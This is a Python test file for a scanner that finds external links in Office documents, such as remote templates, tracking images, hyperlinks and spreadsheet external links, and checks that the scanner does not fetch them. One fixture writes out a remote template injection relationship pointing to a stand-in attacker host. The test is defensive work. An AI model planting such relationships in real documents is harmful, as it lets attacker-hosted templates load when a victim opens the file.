# tests/test_active_links.py
import sys, os, tempfile, zipfile
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from active_links import scan_office_links


# ── helpers ───────────────────────────────────────────────────────────────────

def _make_office(rels_content: str,
                 extra_parts: dict = None,
                 suffix: str = '.docx') -> str:
    """Build a minimal Office zip with a custom .rels file."""
    f = tempfile.NamedTemporaryFile(suffix=suffix, delete=False)
    with zipfile.ZipFile(f.name, 'w') as zf:
        zf.writestr('[Content_Types].xml',
                    '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"></Types>')
        zf.writestr('word/document.xml',
                    '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body></w:body></w:document>')
        zf.writestr('word/_rels/document.xml.rels', rels_content)
        if extra_parts:
            for name, data in extra_parts.items():
                zf.writestr(name, data)
    f.close()
    return f.name


CLEAN_RELS = '''<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>
</Relationships>'''

REMOTE_TEMPLATE_RELS = '''<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    Target="http://attacker.example.com/evil.dotx"
    TargetMode="External"/>
</Relationships>'''

EXTERNAL_IMAGE_RELS = '''<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="https://tracker.example.com/pixel.png"
    TargetMode="External"/>
</Relationships>'''

EXTERNAL_HYPERLINK_RELS = '''<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"
    Target="https://example.com/page"
    TargetMode="External"/>
</Relationships>'''


# ── tests ─────────────────────────────────────────────────────────────────────

def test_clean_no_findings():
    path = _make_office(CLEAN_RELS)
    result = scan_office_links(path)
    os.unlink(path)
    assert result["clean"] is True
    assert result["findings"] == []


def test_remote_template_detected():
    path = _make_office(REMOTE_TEMPLATE_RELS)
    result = scan_office_links(path)
    os.unlink(path)
    types = [f["type"] for f in result["findings"]]
    assert "remote_template" in types
    assert any("attacker.example.com" in f.get("url", "")
               for f in result["findings"])


def test_remote_template_not_fetched():
    path = _make_office(REMOTE_TEMPLATE_RELS)
    result = scan_office_links(path)
    os.unlink(path)
    for f in result["findings"]:
        assert f["action_taken"] == "not_fetched"


def test_external_image_detected():
    path = _make_office(EXTERNAL_IMAGE_RELS)
    result = scan_office_links(path)
    os.unlink(path)
    types = [f["type"] for f in result["findings"]]
    assert "external_link" in types


def test_external_hyperlink_detected():
    path = _make_office(EXTERNAL_HYPERLINK_RELS)
    result = scan_office_links(path)
    os.unlink(path)
    types = [f["type"] for f in result["findings"]]
    assert "external_link" in types


def test_external_urls_collected():
    path = _make_office(REMOTE_TEMPLATE_RELS)
    result = scan_office_links(path)
    os.unlink(path)
    assert len(result["external_urls"]) > 0
    assert any("attacker" in u for u in result["external_urls"])


def test_xlsx_external_link():
    """XLSX with xl/externalLinks/ entry."""
    ext_link_xml = '''<?xml version="1.0"?>
<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <externalBook xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
    r:id="rId1"/>
</externalLink>'''
    ext_link_rels = '''<?xml version="1.0"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLinkPath"
    Target="https://data.example.com/prices.xlsx"
    TargetMode="External"/>
</Relationships>'''
    f = tempfile.NamedTemporaryFile(suffix='.xlsx', delete=False)
    with zipfile.ZipFile(f.name, 'w') as zf:
        zf.writestr('[Content_Types].xml', '<Types/>')
        zf.writestr('xl/externalLinks/externalLink1.xml', ext_link_xml)
        zf.writestr('xl/externalLinks/_rels/externalLink1.xml.rels',
                    ext_link_rels)
    f.close()
    result = scan_office_links(f.name)
    os.unlink(f.name)
    types = [fi["type"] for fi in result["findings"]]
    assert "external_link" in types


# ── runner ────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    tests = [
        test_clean_no_findings,
        test_remote_template_detected,
        test_remote_template_not_fetched,
        test_external_image_detected,
        test_external_hyperlink_detected,
        test_external_urls_collected,
        test_xlsx_external_link,
    ]
    passed = failed = 0
    for t in tests:
        try:
            t()
            print(f"  PASS  {t.__name__}")
            passed += 1
        except Exception as e:
            print(f"  FAIL  {t.__name__}  {e}")
            failed += 1
    print(f"\n{passed}/{passed+failed} passed")